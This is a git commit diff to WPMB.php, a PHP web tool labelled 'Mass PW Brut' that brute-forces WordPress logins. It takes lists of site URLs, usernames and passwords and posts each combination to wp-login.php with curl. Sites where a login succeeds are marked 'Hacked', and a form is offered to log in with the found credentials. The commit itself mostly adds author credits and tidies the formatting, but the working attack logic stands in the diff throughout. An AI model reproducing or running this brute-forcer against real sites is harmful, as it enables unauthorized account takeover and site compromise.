40a2a246b490cca4ae8ce0bea3d80e2a0bd2fa2c
B10S <bios.ma@inbox.ru>
2017-06-01 17:36:04 +0000

    Update WPMB.php

--- WPMB.php
+++ WPMB.php
@@ -1,4 +1,5 @@
 <?php 
+// Coded By 8105 
 // google.com/+BiosMA 
 // youtube.com/channel/UCfR2IybMVNG5Q8Qp3GMCvRA 
 // fb.com/B10S-1309549119165925 
@@ -6,8 +7,13 @@ error_reporting(0);
 set_time_limit(0); 
 ignore_user_abort(true); 
 ?><!DOCTYPE html><!--[if IE 8]><html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en"><![endif]--><!--[if !(IE 8) ]><!--> 
+<!-- By B10S (8105) --> 
+<!-- google.com/+BiosMA --> 
+<!-- youtube.com/channel/UCfR2IybMVNG5Q8Qp3GMCvRA  --> 
+<!-- fb.com/B10S-1309549119165925  --> 
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
 <title>WPMB By (B10S)</title> 
+<link rel="fluid-icon" href="https://lh5.googleusercontent.com/OcCKV6hPCJ5mZRi10xYenLK--OptsMhPWCIOG62DtWGpjthGSJpSJYJTWXqviR9gJsVWZ6CruBScrZc=w1280-h918"> 
 <style type="text/css">textarea{padding:7px 14px;height:312px;color:#2e4453;font-size:16px;font-weight:normal;line-height:1.5;border:1px solid#c8d7e1; 
 background-color:white;box-shadow:none;transition:all.15s ease-in-out;} 
 #brd{border:1px solid black;border-collapse:collapse;padding:5px} 
@@ -19,8 +25,8 @@ button{background:#00aadc;border-color:#0087be;color:white;border-style:solid;bo
 input{width:45%;background:#00aadc;border-color:#0087be;color:white;border-style:solid;border-width:1px 1px 2px;cursor:pointer; 
 font-size:14px;line-height:1.3;border-radius:4px;padding:10px 16px;}</style></head><body bgcolor="#e9eff3"><center> 
 <div id="login" style="width:65%;height:50%"> 
-<h1><a href="https://wordpress.com/" title="WordPress.com" tabindex="-1">~:: Mass PW Brut ::~</a></h1> 
-<img src="https://lh3.googleusercontent.com/obQGLnd-9QtTN6lVHOlpTAFhAEWq7de1f7vPMVHmXworL2UAoCDE6X6woNnjfBckK2ngh35S=s328-no" width="200" title="Shity WordPress Kracker !  ;-}" /> 
+<h1><a href="https://goo.gl/A16JAU" title="Tool In GitHub" tabindex="-1">~:: Mass PW Brut ::~</a></h1> 
+<img src="https://lh5.googleusercontent.com/OcCKV6hPCJ5mZRi10xYenLK--OptsMhPWCIOG62DtWGpjthGSJpSJYJTWXqviR9gJsVWZ6CruBScrZc=w1280-h918" width="200" title="WPMB By (8105) !  ;-}" /> 
 <form class="form" method="post"><table cellspacing="0" cellpadding="0"><center> 
 <tr><td><div id="FIN">List Site :</div></td><td><div id="FIN">User Names </div></td><td><div id="FIN">Pass Words</div></td></tr>
 <tr><td><textarea name=s>http://example.com/blog</textarea></td><td><textarea name=u>admin</textarea></td> 
@@ -43,8 +49,7 @@ foreach($u as$U=>$_U){
 <td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Error URL !</td><td id='brd'>N/A</td></tr>"; 
         ob_flush();flush(); 
         $s[$S]='NULL'; 
-        continue; 
-      } 
+        continue;} 
       $bt=curl_init(); 
       curl_setopt($bt,CURLOPT_RETURNTRANSFER,1); 
       curl_setopt($bt,CURLOPT_URL,$_S.'wp-login.php'); 
@@ -61,23 +66,18 @@ foreach($u as$U=>$_U){
 <td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Login No Found !</td><td>404</td></tr>"; 
         ob_flush();flush(); 
         $s[$S]='NULL'; 
-        continue; 
-      } 
+        continue;} 
       if(eregi("profile.php",$rez)){ 
-echo'<iframe src="'.$_S.'wp-admin" style="width:0;height:0;border:0;border:none;"></iframe>'; 
-        ob_flush();flush(); 
+echo'<iframe src="'.$_S.'wp-admin/" style="width:0;height:0;border:0;border:none;"></iframe>'; 
+ob_flush();flush(); 
 echo"<tr id='brd' style='color:#0F0'><td>".$_S."</td><td id='brd'>".$_U."</td><td id='brd'>".$_P."</td><td id='brd'>Hacked</td> 
 <td id='brd'><form target=_blank action='".$_S."wp-login.php' method=POST><input type=hidden name=log value=".$_U." /> 
 <input type=hidden name=pwd value=".$_P." /> 
 <input type=hidden name=testcookie value=1 /><button>Connect</button></form>"; 
-        ob_flush();flush(); 
-      } 
-    } 
-  } 
-} 
+        ob_flush();flush();}}}} 
 echo"</table>";} 
 function th($ts){ 
-	$R=curl_init(); 
+  $R=curl_init(); 
     curl_setopt($R,CURLOPT_URL,$ts); 
     curl_setopt($R,CURLOPT_BINARYTRANSFER,1); 
     curl_setopt($R,CURLOPT_HEADERFUNCTION,'curlHeaderCallback'); 
@@ -85,6 +85,5 @@ function th($ts){
     curl_exec($R); 
     $RN=curl_getinfo($R,CURLINFO_HTTP_CODE); 
     curl_close($R); 
-	return $RN==200?true:false; 
-} 
+  return $RN==200?true:false;} 
 ?></center></body></html> 
